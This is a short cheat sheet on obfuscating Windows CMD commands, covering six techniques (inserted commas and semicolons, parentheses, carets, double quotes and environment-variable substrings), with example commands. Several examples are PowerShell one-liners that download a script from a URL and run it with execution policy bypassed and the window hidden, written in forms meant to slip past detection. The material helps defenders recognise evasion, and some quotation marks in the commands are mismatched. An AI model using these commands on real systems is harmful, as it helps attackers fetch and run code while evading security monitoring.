# Obfuscating windows CMD

1. Inserting characters - insert special characters such as comma(,) and semicolon (;) between malicious commands and strings to make well-known commands more complex to detect

```
,;cmd.exe,/c,;,echo;powershell.exe -NoExit -exec bypass -nop Invoke-Expression(New-Object System.Net.WebClient).DownloadString(‘https://google.com”)&&echo,exit
```

2. Inverting Parantheses - When parentheses are used, variables in a code block are evaluated as a single line command. Attackers exploit this feature to split and obfuscate malicious commands
```
cmd.exe /c ((echo command1) &&( echo command2))
```

3. Inserting Caret symbol - The caret symbol (^) is a reserved character used in shell commands for escaping. Attackers exploit this feature to escape malicious commands during execution time
```
C:\WINDOWS\system32\cmd.exe /c p^^o^^w^^e^^r^^s^^h^^e^^l^^l^^.^^e^^x^^e -No^^Exit -exec bypass -nop Invoke-Expression (New-Object System.Net.WebClient). DownloadString((‘https://google.com”)&&echo,exit
```

4. Inserting double quotes - The command line parser uses the double quote symbol as an argument delimiter. Attackers use this symbol to concatenate malicious commands in arguments
```
Pow""er""Shell -N""oExit -ExecutionPolicy bypass -noprofile -windowstyle hidden cmd /c Img.jpg
```

5. Using custon environment vars - In the Windows operating system, environment variables are dynamic objects that store modifiable values used by applications at runtime. Attackers exploit environment variables to split malicious commands into multiple string
```
set a=Power &&set b=Shell && %a:~0,-1%%b% -ExecutionPolicy bypass -noprofile -windowstyle hidden cmd /c Doc.pdf
```

6. Using Pre-Assigned Enrironment Variables - “%CommonProgramFiles%” contains a default value “C:\Program Files\Common Files”. Specific characters from this value can be accessed through indexing and used to execute malicious commands
```
cmd.exe /c “%CommonProgramFiles:~3,1%owerShell.exe” -windowstyle hidden -command wscript script.vbc
```